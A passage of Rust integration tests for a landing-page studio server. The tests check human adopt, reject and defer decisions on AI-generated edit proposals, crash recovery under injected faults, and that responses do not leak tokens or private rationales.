        let approval_token = string_at(&response_json(approval).await, "/approval/token");
        let decision = harness
            .post(
                &format!("/api/v1/reviews/{review_id}/decisions"),
                json!({
                    "schemaVersion":"1",
                    "approvalToken":approval_token,
                    "proposalId":proposal_id,
                    "expectedRevisionId":base_revision_id,
                    "disposition":disposition,
                    "intentId":intent_id,
                    "rationale":"restart integration review"
                }),
            )
            .await;
        assert_eq!(decision.status(), StatusCode::OK);
        let decision = response_json(decision).await;
        let resulting_revision_id = string_at(&decision, "/project/revisionId");
        let resulting_manifest = string_at(&decision, "/project/acceptedManifestSha256");
        if disposition == "adopted_unchanged" {
            assert_ne!(resulting_revision_id, base_revision_id);
        } else {
            assert_eq!(resulting_revision_id, base_revision_id);
        }

        let terminal =
            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
        assert_eq!(
            terminal["review"]["status"],
            match disposition {
                "adopted_unchanged" => "adopted",
                "rejected" => "rejected",
                "deferred" => "deferred",
                _ => unreachable!(),
            }
        );
        assert_eq!(terminal["review"]["proposal"], Value::Null);
        assert_eq!(terminal["review"]["decision"]["proposalId"], proposal_id);
        assert_eq!(
            terminal["review"]["decision"]["artifactManifestSha256"],
            resulting_manifest
        );

        let harness = harness.restart().await;
        let rehydrated =
            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
        assert_eq!(rehydrated["project"]["activeReview"], Value::Null);
        assert_eq!(
            rehydrated["project"]["history"].as_array().unwrap().len(),
            1
        );
        assert_eq!(
            rehydrated["project"]["history"][0]["resultingAcceptedManifestSha256"],
            resulting_manifest
        );
        assert_eq!(rehydrated["project"]["revisionId"], resulting_revision_id);

        let reconciled = harness
            .post(
                &format!("/api/v1/operations/reviews/{review_id}/reconcile"),
                json!({"schemaVersion":"1"}),
            )
            .await;
        assert_eq!(reconciled.status(), StatusCode::OK);
        let reconciled = response_json(reconciled).await;
        assert_eq!(reconciled["review"]["proposal"], Value::Null);
        assert_eq!(
            reconciled["review"]["decision"]["artifactManifestSha256"],
            resulting_manifest
        );
    }
}

#[tokio::test]
async fn startup_reconciles_a_core_decision_committed_before_local_receipt_or_pointer() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    for (index, disposition) in [
        DispositionDto::AdoptedUnchanged,
        DispositionDto::Rejected,
        DispositionDto::Deferred,
    ]
    .into_iter()
    .enumerate()
    {
        let harness = Harness::new().await;
        let (project_id, base_revision_id, proposal_id, review_id) =
            create_blank_fake_proposal(&harness, 2_100 + index as u128).await;
        let (project_snapshot, proposal_snapshot) = {
            let store = harness.state.store().unwrap();
            let project = store.projects.get(&project_id).unwrap();
            (
                project.id.clone(),
                project.proposal.as_ref().unwrap().clone(),
            )
        };
        let sidecar = {
            let store = harness.state.store().unwrap();
            let project = store.projects.get(&project_id).unwrap();
            open_runtime_sidecar(&harness.state, project, &proposal_snapshot).unwrap()
        };
        let outcome = sidecar
            .decide(
                &review_id,
                disposition.artifact(),
                Some("simulated crash after Core Decision"),
                format!("core-before-local-{index}").as_bytes(),
            )
            .unwrap();
        assert!(matches!(outcome, ReviewOutcome::DecisionCommitted(_)));
        assert_eq!(project_snapshot, project_id);
        {
            let store = harness.state.store().unwrap();
            let project = store.projects.get(&project_id).unwrap();
            assert_eq!(project.revision_id, base_revision_id);
            assert!(project.history.is_empty());
            assert_eq!(project.proposal.as_ref().unwrap().id, proposal_id);
        }

        let harness = harness.restart().await;
        let project =
            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
        assert_eq!(project["project"]["activeReview"], Value::Null);
        assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
        assert_eq!(
            project["project"]["history"][0]["disposition"],
            match disposition {
                DispositionDto::AdoptedUnchanged => "adopted_unchanged",
                DispositionDto::Rejected => "rejected",
                DispositionDto::Deferred => "deferred",
            }
        );
        if disposition == DispositionDto::AdoptedUnchanged {
            assert_ne!(project["project"]["revisionId"], base_revision_id);
        } else {
            assert_eq!(project["project"]["revisionId"], base_revision_id);
        }
        let terminal =
            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
        assert_eq!(
            terminal["review"]["decision"]["artifactManifestSha256"],
            project["project"]["acceptedManifestSha256"]
        );
    }
}

#[tokio::test]
async fn sequential_reviews_survive_restart_and_defer_creates_a_derived_proposal() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let mut harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let mut revision_id = string_at(&created, "/project/revisionId");
    let initial_revision_id = revision_id.clone();
    let mut deferred_proposal_id: Option<String> = None;

    for (index, disposition) in ["rejected", "deferred", "adopted_unchanged"]
        .into_iter()
        .enumerate()
    {
        let proposal = create_fake_proposal_for_project(
            &harness,
            &project_id,
            &revision_id,
            2_200 + index as u128,
        )
        .await;
        let proposal_id = string_at(&proposal, "/proposal/id");
        let review_id = string_at(&proposal, "/proposal/reviewId");
        if index == 2 {
            assert_eq!(
                proposal["proposal"]["derivedFromProposalId"],
                deferred_proposal_id.as_deref().unwrap()
            );
        } else {
            assert_eq!(proposal["proposal"].get("derivedFromProposalId"), None);
        }
        let intent_id = format!("sequential-review-{index}");
        let approval = harness
            .post(
                &format!("/api/v1/reviews/{review_id}/approvals"),
                json!({
                    "schemaVersion":"1",
                    "proposalId":proposal_id,
                    "expectedRevisionId":revision_id,
                    "disposition":disposition,
                    "intentId":intent_id
                }),
            )
            .await;
        assert_eq!(approval.status(), StatusCode::CREATED);
        let approval_token = string_at(&response_json(approval).await, "/approval/token");
        let decision = harness
            .post(
                &format!("/api/v1/reviews/{review_id}/decisions"),
                json!({
                    "schemaVersion":"1",
                    "approvalToken":approval_token,
                    "proposalId":proposal_id,
                    "expectedRevisionId":revision_id,
                    "disposition":disposition,
                    "intentId":intent_id,
                    "rationale":"sequential restart test"
                }),
            )
            .await;
        assert_eq!(decision.status(), StatusCode::OK);
        let decision = response_json(decision).await;
        revision_id = string_at(&decision, "/project/revisionId");
        if disposition == "deferred" {
            deferred_proposal_id = Some(proposal_id);
        }
        harness = harness.restart().await;
    }

    assert_ne!(revision_id, initial_revision_id);
    let project = response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
    assert_eq!(project["project"]["history"].as_array().unwrap().len(), 3);
    assert_eq!(project["project"]["history"][0]["disposition"], "rejected");
    assert_eq!(project["project"]["history"][1]["disposition"], "deferred");
    assert_eq!(
        project["project"]["history"][2]["disposition"],
        "adopted_unchanged"
    );
    assert_eq!(project["project"]["revisionId"], revision_id);
}

#[tokio::test]
async fn every_decision_failpoint_recovers_without_a_split_brain() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    for (index, failpoint) in fault_injection::Failpoint::ALL.into_iter().enumerate() {
        let harness = Harness::new().await;
        let (project_id, base_revision_id, review_id, request) =
            prepare_faulted_decision(&harness, "adopted_unchanged", 3_000 + index as u128).await;
        let approval_token = request["approvalToken"].as_str().unwrap().to_owned();
        let state_root = harness._root.path().to_string_lossy().into_owned();
        let response_body;
        {
            let _scenario = fault_injection::testing::Scenario::begin();
            fault_injection::testing::fail_next(failpoint);
            let response = harness
                .post(
                    &format!("/api/v1/reviews/{review_id}/decisions"),
                    request.clone(),
                )
                .await;
            response_body = String::from_utf8(response_bytes(response).await).unwrap();
            assert!(
                fault_injection::testing::hit_count(failpoint) > 0,
                "{} was not reached",
                failpoint.name()
            );
            assert!(!response_body.contains("fault matrix private rationale"));
            assert!(!response_body.contains(&approval_token));
            assert!(!response_body.contains(&state_root));
        }

        let harness = harness.restart().await;
        let project =
            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
        let failed_before_intent = matches!(
            failpoint,
            fault_injection::Failpoint::DecisionObjectWriteBefore
                | fault_injection::Failpoint::DecisionObjectWriteAfter
                | fault_injection::Failpoint::DecisionJournalIntentBefore
        );
        if failed_before_intent {
            assert_eq!(project["project"]["revisionId"], base_revision_id);
            assert_eq!(project["project"]["history"].as_array().unwrap().len(), 0);
            assert_eq!(
                project["project"]["activeReview"]["status"],
                "pending_review"
            );
        } else {
            assert_ne!(project["project"]["revisionId"], base_revision_id);
            assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
            assert!(project["project"]["activeReview"].is_null());
            let review =
                response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
            assert_eq!(review["review"]["status"], "adopted");
            assert_eq!(review["review"]["reconciliationRequired"], false);
        }
    }
}

#[tokio::test]
async fn post_decision_faults_never_claim_accepted_state_is_unchanged() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let failpoints = [
        fault_injection::Failpoint::DecisionSynapseCallBefore,
        fault_injection::Failpoint::DecisionReceiptPersistAfter,
        fault_injection::Failpoint::DecisionMaterializeBefore,
        fault_injection::Failpoint::DecisionJournalCompleteBefore,
        fault_injection::Failpoint::DecisionResponseBefore,
    ];
    for (index, failpoint) in failpoints.into_iter().enumerate() {
        let harness = Harness::new().await;
        let (_, _, review_id, request) =
            prepare_faulted_decision(&harness, "adopted_unchanged", 3_050 + index as u128).await;
        let _scenario = fault_injection::testing::Scenario::begin();
        fault_injection::testing::fail_next(failpoint);
        let response = harness
            .post(&format!("/api/v1/reviews/{review_id}/decisions"), request)
            .await;
        assert!(!response.status().is_success(), "{}", failpoint.name());
        assert!(
            fault_injection::testing::hit_count(failpoint) > 0,
            "{} was not reached",
            failpoint.name()
        );
        let request_id = response
            .headers()
            .get("x-request-id")
            .unwrap()
            .to_str()
            .unwrap()
            .to_owned();
        let operation_id = response
            .headers()
            .get("x-operation-id")
            .unwrap()
            .to_str()
            .unwrap()
            .to_owned();
        let body = response_json(response).await;
        assert!(
            matches!(
                body["error"]["code"].as_str(),
                Some("decision_reconciliation_required" | "decision_outcome_unknown")
            ),
            "{}: {body:#}",
            failpoint.name()
        );
        assert_eq!(body["error"]["requestId"], request_id);
        assert_eq!(body["error"]["operationId"], operation_id);
        assert_eq!(
            body["error"]["detail"],
            json!({
                "acceptedState":"reconciliation_required",
                "recoveryAction":"reconcile"
            })
        );
        assert_ne!(body["error"]["detail"]["acceptedState"], "unchanged");
        assert!(
            !serde_json::to_string(&body)
                .unwrap()
                .contains("fault matrix private rationale")
        );
    }
}

#[tokio::test]
async fn successful_adoption_reaches_the_documented_failpoint_occurrence_profile() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let harness = Harness::new().await;
    let (_, _, review_id, request) =
        prepare_faulted_decision(&harness, "adopted_unchanged", 3_099).await;
    let _scenario = fault_injection::testing::Scenario::begin();
    let response = harness
        .post(&format!("/api/v1/reviews/{review_id}/decisions"), request)
        .await;
    assert_eq!(response.status(), StatusCode::OK);
    for failpoint in fault_injection::Failpoint::ALL {
        assert_eq!(
            fault_injection::testing::hit_count(failpoint),
            expected_adoption_occurrences(failpoint),
            "the abort matrix must be updated when {} gains a durable occurrence",
            failpoint.name()
        );
    }
}

const fn expected_adoption_occurrences(failpoint: fault_injection::Failpoint) -> u64 {
    match failpoint {
        fault_injection::Failpoint::DecisionObjectWriteBefore
        | fault_injection::Failpoint::DecisionObjectWriteAfter
        | fault_injection::Failpoint::DecisionReceiptQueryBefore
        | fault_injection::Failpoint::DecisionReceiptQueryAfter => 2,
        fault_injection::Failpoint::StorageWriteBefore
        | fault_injection::Failpoint::StorageWriteAfter
        | fault_injection::Failpoint::StorageRenameBefore
        | fault_injection::Failpoint::StorageRenameAfter => 7,
        fault_injection::Failpoint::StorageFsyncBefore
        | fault_injection::Failpoint::StorageFsyncAfter => 14,
        _ => 1,
    }
}

#[tokio::test]
async fn receipt_failure_recovery_preserves_each_human_disposition() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    for (index, disposition) in ["adopted_unchanged", "rejected", "deferred"]
        .into_iter()
        .enumerate()
    {
        let harness = Harness::new().await;
        let (project_id, base_revision_id, review_id, request) =
            prepare_faulted_decision(&harness, disposition, 3_100 + index as u128).await;
        {
            let _scenario = fault_injection::testing::Scenario::begin();
            fault_injection::testing::fail_next(
                fault_injection::Failpoint::DecisionReceiptPersistAfter,
            );
            let response = harness
                .post(&format!("/api/v1/reviews/{review_id}/decisions"), request)
                .await;
            assert!(response.status().is_server_error());
        }
        let harness = harness.restart().await;
        let project =
            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
        assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
        if disposition == "adopted_unchanged" {
            assert_ne!(project["project"]["revisionId"], base_revision_id);
        } else {
            assert_eq!(project["project"]["revisionId"], base_revision_id);
        }
        let review =
            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
        let expected_status = match disposition {
            "adopted_unchanged" => "adopted",
            "rejected" => "rejected",
            "deferred" => "deferred",
            _ => unreachable!(),
        };
        assert_eq!(review["review"]["status"], expected_status);
    }
}

#[tokio::test]
async fn storage_full_and_permission_failures_preserve_accepted_then_reconcile_forward() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let cases = [
        (
            fault_injection::Failpoint::StorageWriteBefore,
            fault_injection::InjectedFailureKind::StorageFull,
        ),
        (
            fault_injection::Failpoint::StorageWriteAfter,
            fault_injection::InjectedFailureKind::PermissionDenied,
        ),
        (
            fault_injection::Failpoint::StorageFsyncBefore,
            fault_injection::InjectedFailureKind::StorageFull,
        ),
        (
            fault_injection::Failpoint::StorageFsyncAfter,
            fault_injection::InjectedFailureKind::PermissionDenied,
        ),
        (
            fault_injection::Failpoint::StorageRenameBefore,
            fault_injection::InjectedFailureKind::StorageFull,
        ),
        (
            fault_injection::Failpoint::StorageRenameAfter,
            fault_injection::InjectedFailureKind::PermissionDenied,
        ),
    ];
    for (index, (failpoint, kind)) in cases.into_iter().enumerate() {
        let harness = Harness::new().await;
        let (project_id, base_revision_id, review_id, request) =
            prepare_faulted_decision(&harness, "adopted_unchanged", 3_150 + index as u128).await;
        let root = harness._root.path().to_path_buf();
        let project_root = root.join("managed-v1/projects").join(&project_id);
        let current_before = std::fs::read(project_root.join("current.json")).unwrap();
        let site_before = source_fingerprint(&project_root.join("site"));
        let approval_token = request["approvalToken"].as_str().unwrap().to_owned();

        let response_body;
        {
            let _scenario = fault_injection::testing::Scenario::begin();
            fault_injection::testing::fail_on_kind(failpoint, 1, kind);
            let response = harness
                .post(&format!("/api/v1/reviews/{review_id}/decisions"), request)
                .await;
            assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
            response_body = String::from_utf8(response_bytes(response).await).unwrap();
            assert_eq!(fault_injection::testing::hit_count(failpoint), 1);
        }
        assert_eq!(
            std::fs::read(project_root.join("current.json")).unwrap(),
            current_before
        );
        assert_eq!(source_fingerprint(&project_root.join("site")), site_before);
        for forbidden in [
            "fault matrix private rationale",
            approval_token.as_str(),
            root.to_string_lossy().as_ref(),
            "StorageFull",
            "PermissionDenied",
        ] {
            assert!(
                !response_body.contains(forbidden),
                "unsafe diagnostic from {}",
                failpoint.name()
            );
        }
        assert!(response_body.contains("decision_reconciliation_required"));
        assert!(response_body.contains("\"acceptedState\":\"reconciliation_required\""));
        assert!(response_body.contains("\"recoveryAction\":\"reconcile\""));

        let harness = harness.restart().await;
        let project =
            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
        assert_ne!(project["project"]["revisionId"], base_revision_id);
        assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
        assert!(project["project"]["activeReview"].is_null());
        let review =
            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
        assert_eq!(review["review"]["status"], "adopted");
        assert_eq!(review["review"]["reconciliationRequired"], false);
    }
}

#[test]
#[ignore = "subprocess-only helper for crash recovery tests"]
fn decision_abort_child() {
    if std::env::var_os("LP_STUDIO_TEST_ABORT_CHILD").is_none() {
        return;
    }
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let root = std::path::PathBuf::from(
            std::env::var("LP_STUDIO_TEST_STATE_ROOT").expect("child state root"),
        );
        let revision_id = std::env::var("LP_STUDIO_TEST_REVISION_ID").expect("child revision");
        let proposal_id = std::env::var("LP_STUDIO_TEST_PROPOSAL_ID").expect("child proposal");
        let review_id = std::env::var("LP_STUDIO_TEST_REVIEW_ID").expect("child review");
        let disposition = std::env::var("LP_STUDIO_TEST_DISPOSITION").expect("child disposition");
        let failpoint_name = std::env::var("LP_STUDIO_TEST_FAILPOINT").expect("child failpoint");
        let occurrence = std::env::var("LP_STUDIO_TEST_FAILPOINT_OCCURRENCE")
            .expect("child failpoint occurrence")
            .parse::<u64>()
            .expect("valid child failpoint occurrence");
        let failpoint = fault_injection::Failpoint::ALL
            .into_iter()
            .find(|candidate| candidate.name() == failpoint_name)
            .expect("known failpoint");
        let config = ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            &root,
            root.join("missing-web-dist"),
        );
        let state = StudioState::new(config).expect("child state opens");
        let token = bootstrap_token(&state).await;
        let intent_id = "process-abort-intent";
        let approval = post_for(
            &state,
            &token,
            &format!("/api/v1/reviews/{review_id}/approvals"),
            json!({
                "schemaVersion":"1",
                "proposalId":proposal_id,
                "expectedRevisionId":revision_id,
                "disposition":disposition,
                "intentId":intent_id
            }),
        )
        .await;
        assert_eq!(approval.status(), StatusCode::CREATED);
        let approval_token = string_at(&response_json(approval).await, "/approval/token");
        let _scenario = fault_injection::testing::Scenario::begin();
        fault_injection::testing::abort_on(failpoint, occurrence);
        let _ = post_for(
            &state,
            &token,
            &format!("/api/v1/reviews/{review_id}/decisions"),
            json!({
                "schemaVersion":"1",
                "approvalToken":approval_token,
                "proposalId":proposal_id,
                "expectedRevisionId":revision_id,
                "disposition":disposition,
                "intentId":intent_id,
                "rationale":"private child rationale"
            }),
        )
        .await;
        panic!("abort failpoint was not reached");
    });
}

#[tokio::test]
async fn every_reached_decision_failpoint_occurrence_survives_real_process_abort() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let cases = fault_injection::Failpoint::ALL
        .into_iter()
        .flat_map(|failpoint| {
            (1..=expected_adoption_occurrences(failpoint))
                .map(move |occurrence| (failpoint, occurrence))
        })
        .collect::<Vec<_>>();
    assert_eq!(cases.len(), 80, "the explicit process-abort matrix changed");
    for (index, (failpoint, occurrence)) in cases.into_iter().enumerate() {
        let disposition = "adopted_unchanged";
        let harness = Harness::new().await;
        let (project_id, revision_id, proposal_id, review_id) =
            create_blank_fake_proposal(&harness, 3_200 + index as u128).await;
        let Harness {
            _root: temp_root,
            _import,
            state,
            token: _,
        } = harness;
        let root = temp_root.path().to_path_buf();
        drop(state);
        drop(_import);

        let output = std::process::Command::new(std::env::current_exe().unwrap())
            .arg("--exact")
            .arg("tests::decision_abort_child")
            .arg("--ignored")
            .arg("--nocapture")
            .arg("--test-threads=1")
            .env("LP_STUDIO_TEST_ABORT_CHILD", "1")
            .env("LP_STUDIO_TEST_STATE_ROOT", &root)
            .env("LP_STUDIO_TEST_REVISION_ID", &revision_id)
            .env("LP_STUDIO_TEST_PROPOSAL_ID", &proposal_id)
            .env("LP_STUDIO_TEST_REVIEW_ID", &review_id)
            .env("LP_STUDIO_TEST_DISPOSITION", disposition)
            .env("LP_STUDIO_TEST_FAILPOINT", failpoint.name())
            .env(
                "LP_STUDIO_TEST_FAILPOINT_OCCURRENCE",
                occurrence.to_string(),
            )
            .env("RUST_BACKTRACE", "0")
            .output()
            .expect("crash child starts");
        assert!(
            !output.status.success(),
            "{} occurrence {occurrence} did not abort",
            failpoint.name()
        );
        for captured in [&output.stdout, &output.stderr] {
            let captured = String::from_utf8_lossy(captured);
            assert!(!captured.contains("private child rationale"));
            assert!(!captured.contains(&root.to_string_lossy().into_owned()));
        }

        let config = ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            &root,
            root.join("missing-web-dist"),
        );
        let state = StudioState::new(config).expect("post-abort state recovers");
        let token = bootstrap_token(&state).await;
        let project =
            response_json(get_for(&state, &token, &format!("/api/v1/projects/{project_id}")).await)
                .await;
        let failed_before_intent = matches!(
            failpoint,
            fault_injection::Failpoint::DecisionObjectWriteBefore
                | fault_injection::Failpoint::DecisionObjectWriteAfter
                | fault_injection::Failpoint::DecisionJournalIntentBefore
        );
        if failed_before_intent {
            assert_eq!(project["project"]["history"].as_array().unwrap().len(), 0);
            assert_eq!(project["project"]["revisionId"], revision_id);
            assert_eq!(
                project["project"]["activeReview"]["status"],
                "pending_review"
            );
        } else {
            assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
            assert!(project["project"]["activeReview"].is_null());
            assert_ne!(project["project"]["revisionId"], revision_id);
            let review = response_json(
                get_for(&state, &token, &format!("/api/v1/reviews/{review_id}")).await,
            )
            .await;
            assert_eq!(review["review"]["status"], "adopted");
            assert_eq!(review["review"]["reconciliationRequired"], false);
        }

        let project_root = root.join("managed-v1/projects").join(&project_id);
        for transient in ["transaction.json", "site.staging", "site.backup"] {
            assert!(
                !project_root.join(transient).exists(),
                "{transient} survived {} occurrence {occurrence}",
                failpoint.name(),
            );
        }
        drop(state);
        drop(temp_root);
    }
}

#[tokio::test]
async fn real_process_abort_preserves_reject_and_defer_without_advancing_accepted() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let cases = [
        (
            "rejected",
            fault_injection::Failpoint::DecisionReceiptPersistAfter,
        ),
        (
            "deferred",
            fault_injection::Failpoint::DecisionJournalCompleteAfter,
        ),
    ];
    for (index, (disposition, failpoint)) in cases.into_iter().enumerate() {
        let harness = Harness::new().await;
        let (project_id, revision_id, proposal_id, review_id) =
            create_blank_fake_proposal(&harness, 3_300 + index as u128).await;
        let Harness {
            _root: temp_root,
            _import,
            state,
            token: _,
        } = harness;
        let root = temp_root.path().to_path_buf();
        let accepted_before = source_fingerprint(
            &root
                .join("managed-v1/projects")
                .join(&project_id)
                .join("site"),
        );
        drop(state);
        drop(_import);

        let output = std::process::Command::new(std::env::current_exe().unwrap())
            .arg("--exact")
            .arg("tests::decision_abort_child")
            .arg("--ignored")
            .arg("--nocapture")
            .arg("--test-threads=1")
            .env("LP_STUDIO_TEST_ABORT_CHILD", "1")
            .env("LP_STUDIO_TEST_STATE_ROOT", &root)
            .env("LP_STUDIO_TEST_REVISION_ID", &revision_id)
            .env("LP_STUDIO_TEST_PROPOSAL_ID", &proposal_id)
            .env("LP_STUDIO_TEST_REVIEW_ID", &review_id)
            .env("LP_STUDIO_TEST_DISPOSITION", disposition)
            .env("LP_STUDIO_TEST_FAILPOINT", failpoint.name())
            .env("LP_STUDIO_TEST_FAILPOINT_OCCURRENCE", "1")
            .env("RUST_BACKTRACE", "0")
            .output()
            .expect("crash child starts");
        assert!(!output.status.success());

        let state = StudioState::new(ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            &root,
            root.join("missing-web-dist"),
        ))
        .expect("post-abort state recovers");
        let token = bootstrap_token(&state).await;
        let project =
            response_json(get_for(&state, &token, &format!("/api/v1/projects/{project_id}")).await)
                .await;
        assert_eq!(project["project"]["revisionId"], revision_id);
        assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
        assert_eq!(
            source_fingerprint(
                &root
                    .join("managed-v1/projects")
                    .join(&project_id)
                    .join("site")
            ),
            accepted_before
        );
        let review =
            response_json(get_for(&state, &token, &format!("/api/v1/reviews/{review_id}")).await)
                .await;
        assert_eq!(
            review["review"]["status"],
            if disposition == "rejected" {
                "rejected"
            } else {
                "deferred"
            }
        );
    }
}

#[tokio::test]
async fn fake_ai_proposal_is_bound_to_each_selected_element() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let cases = [
        (
            "hero-heading",
            "まだ、白紙です。",
            "対話から、公開できるLPへ。",
            "選択したヒーロー見出し",
        ),
        (
            "hero-copy",
            "伝えたいことを選び、AIとの対話から最初の一歩をつくります。",
            "要望を選び、AIとの対話から公開できるLPへ育てます。",
            "選択したヒーロー説明文",
        ),
        (
            "hero-cta",
            "構想を始める",
            "公開LPをつくる",
            "選択したヒーローCTA",
        ),
    ];

    for (case_index, (element_id, accepted_text, proposed_text, summary_fragment)) in
        cases.into_iter().enumerate()
    {
        let harness = Harness::new().await;
        let create = harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await;
        let create_body = response_json(create).await;
        let project_id = string_at(&create_body, "/project/id");
        let revision_id = string_at(&create_body, "/project/revisionId");

        let target = harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                element_target_request(&revision_id, case_index as u128 + 1, element_id),
            )
            .await;
        assert_eq!(target.status(), StatusCode::CREATED, "target {element_id}");
        let target = response_json(target).await;

        let context = harness
            .post(
                &format!("/api/v1/projects/{project_id}/contexts"),
                context_request(
                    &revision_id,
                    &target,
                    "選択した要素だけを更新してください。",
                ),
            )
            .await;
        assert_eq!(
            context.status(),
            StatusCode::CREATED,
            "context {element_id}"
        );
        let context_body = response_json(context).await;
        let context_id = string_at(&context_body, "/context/id");
        let context_sha = string_at(&context_body, "/context/sha256");
        let canonical: Value =
            serde_json::from_str(context_body["context"]["canonicalJson"].as_str().unwrap())
                .unwrap();
        assert_eq!(
            canonical["target"]["elementAnchor"]["uniqueElementId"],
            element_id
        );
        assert_eq!(
            canonical["targetResolution"]["targetId"],
            target["target"]["targetId"]
        );
        assert_eq!(canonical["selectedText"], accepted_text);

        let proposal = harness
            .post(
                &format!("/api/v1/projects/{project_id}/proposals"),
                json!({
                    "schemaVersion":"1",
                    "contextId":context_id,
                    "contextSha256":context_sha
                }),
            )
            .await;
        assert_eq!(
            proposal.status(),
            StatusCode::CREATED,
            "proposal {element_id}"
        );
        let proposal_body = response_json(proposal).await;
        let summary = proposal_body["proposal"]["summary"].as_str().unwrap();
        let unified_diff = proposal_body["proposal"]["unifiedDiff"].as_str().unwrap();
        assert!(summary.contains(summary_fragment), "summary {element_id}");
        assert!(
            unified_diff.contains(accepted_text),
            "diff old {element_id}"
        );
        assert!(
            unified_diff.contains(proposed_text),
            "diff new {element_id}"
        );
        let proposal_id = string_at(&proposal_body, "/proposal/id");
        let proposal_preview_url = string_at(&proposal_body, "/proposal/previewUrl");

        let preview = preview_router(harness.state.clone())
            .oneshot(
                Request::builder()
                    .uri(format!("/preview/{project_id}/{proposal_id}/"))
                    .header(HOST, preview_host(&proposal_preview_url))
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let preview_html = response_text(preview).await;
        assert!(
            preview_html.contains(proposed_text),
            "preview new {element_id}"
        );
        assert!(
            !preview_html.contains(accepted_text),
            "preview old {element_id}"
        );
        for other in [
            "対話から、公開できるLPへ。",
            "要望を選び、AIとの対話から公開できるLPへ育てます。",
            "公開LPをつくる",
        ] {
            if other != proposed_text {
                assert!(
                    !preview_html.contains(other),
                    "proposal for {element_id} changed another target to {other}"
                );
            }
        }
        let review_id = string_at(&proposal_body, "/proposal/reviewId");
        let intent = format!("cleanup-{element_id}");
        let approval = harness
            .post(
                &format!("/api/v1/reviews/{review_id}/approvals"),
                json!({
                    "schemaVersion":"1",
                    "proposalId":proposal_id,
                    "expectedRevisionId":revision_id,
                    "disposition":"rejected",
                    "intentId":intent
                }),
            )
            .await;
        assert_eq!(approval.status(), StatusCode::CREATED);
        let approval_token = string_at(&response_json(approval).await, "/approval/token");
        let decision = harness
            .post(
                &format!("/api/v1/reviews/{review_id}/decisions"),
                json!({
                    "schemaVersion":"1",
                    "approvalToken":approval_token,
                    "proposalId":proposal_id,
                    "expectedRevisionId":revision_id,
                    "disposition":"rejected",
                    "intentId":intent,
                    "rationale":"test cleanup"
                }),
            )
            .await;
        assert_eq!(decision.status(), StatusCode::OK);
    }
}

#[tokio::test]
async fn blocking_warnings_prevent_adoption_but_allow_reject_and_defer() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    for (index, disposition) in ["adopted_unchanged", "rejected", "deferred"]
        .into_iter()
        .enumerate()
    {
        let harness = Harness::new().await;
        let (project_id, revision_id, proposal_id, review_id) =
            create_blank_fake_proposal(&harness, 100 + index as u128).await;
        {
            let mut store = harness.state.store().unwrap();
            let proposal = store
                .projects
                .get_mut(&project_id)
                .and_then(|project| project.proposal.as_mut())
                .expect("pending proposal");
            proposal.validation.status = "warning".to_owned();
            proposal.validation.checks[0].blocking = true;
        }
        let intent_id = format!("warning-disposition-{index}");
        let approval = harness
            .post(
                &format!("/api/v1/reviews/{review_id}/approvals"),
                json!({
                    "schemaVersion":"1",
                    "proposalId":proposal_id,
                    "expectedRevisionId":revision_id,
                    "disposition":disposition,
                    "intentId":intent_id
                }),
            )
            .await;
        if disposition == "adopted_unchanged" {
            assert_eq!(approval.status(), StatusCode::CONFLICT);
            assert_eq!(
                response_json(approval).await["error"]["code"],
                "proposal_blocked_by_validation"
            );
            continue;
        }

        assert_eq!(approval.status(), StatusCode::CREATED);
        let approval_token = string_at(&response_json(approval).await, "/approval/token");
        let decision = harness
            .post(
                &format!("/api/v1/reviews/{review_id}/decisions"),
                json!({
                    "schemaVersion":"1",
                    "approvalToken":approval_token,
                    "proposalId":proposal_id,
                    "expectedRevisionId":revision_id,
                    "disposition":disposition,
                    "intentId":intent_id,
                    "rationale":"警告を確認し、採用せずに終了します。"
                }),
            )
